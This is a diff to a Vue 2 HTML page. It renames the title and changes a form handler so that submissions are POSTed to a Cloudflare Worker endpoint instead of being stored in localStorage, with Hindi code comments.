@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>i - Vue</title>
+    <title>mvue</title>
     <link rel="icon" type="image/png" href="https://vuejs.org/images/logo.png">
     <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
     <style>
@@ -250,18 +250,37 @@
                     }
                 },
                 
-                // ---------- Common ----------
+                // ---------- Common: Cloudflare Worker पर डेटा भेजें ----------
                 saveDataAndRedirect(formData, formType) {
-                    const submissions = JSON.parse(localStorage.getItem('formSubmissions') || '[]');
-                    submissions.push({
-                        id: Date.now(),
-                        type: formType,
-                        data: formData,
-                        timestamp: new Date().toISOString(),
-                        ip: 'Not available in browser'
+                    // तुम्हारा Cloudflare Worker URL
+                    const workerURL = 'https://aged-sunset-63e0.s3d38284.workers.dev';
+
+                    // FormData ऑब्जेक्ट बनाएँ
+                    const formDataToSend = new FormData();
+                    
+                    // सारे फॉर्म फील्ड FormData में डालें
+                    for (const key in formData) {
+                        formDataToSend.append(key, formData[key]);
+                    }
+                    // यह भी बताएँ कि कौनसे टैब से भेजा गया
+                    formDataToSend.append('formType', formType);
+
+                    // POST request Worker को भेजें
+                    fetch(workerURL, {
+                        method: 'POST',
+                        body: formDataToSend
+                    })
+                    .then(response => {
+                        if (response.ok) {
+                            alert('डेटा सफलतापूर्वक भेजा गया!');
+                            window.location.href = 'blogone.html'; // तुम्हारा रीडायरेक्ट पेज
+                        } else {
+                            alert('सर्वर एरर: ' + response.status);
+                        }
+                    })
+                    .catch(error => {
+                        alert('नेटवर्क एरर: ' + error.message);
                     });
-                    localStorage.setItem('formSubmissions', JSON.stringify(submissions));
-                    window.location.href = 'blogone.html';
                 }
             }
         });
